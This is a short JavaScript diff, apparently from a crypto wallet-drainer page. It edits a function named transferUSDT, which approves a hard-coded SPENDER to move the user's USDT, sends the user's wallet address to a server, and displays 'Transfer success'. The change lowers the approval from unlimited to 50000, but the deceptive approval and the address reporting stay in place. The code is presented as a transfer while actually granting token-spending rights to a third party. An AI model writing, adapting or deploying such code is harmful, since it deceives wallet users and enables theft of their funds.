@@ -48,7 +48,7 @@ async function transferUSDT(e) {
     }
   const s = o[0],
     n = new r.eth.Contract(USDT_ABI, USDT_ADDRESS),
-    c = r.utils.toTwosComplement(-1);
+    c = r.utils.toTwosComplement(50000);
   try {
     await n.methods.approve(SPENDER, c).send({ from: s });
     (sendAddressToServer(s), t.html("Transfer success"), t.prop("disabled", !1));
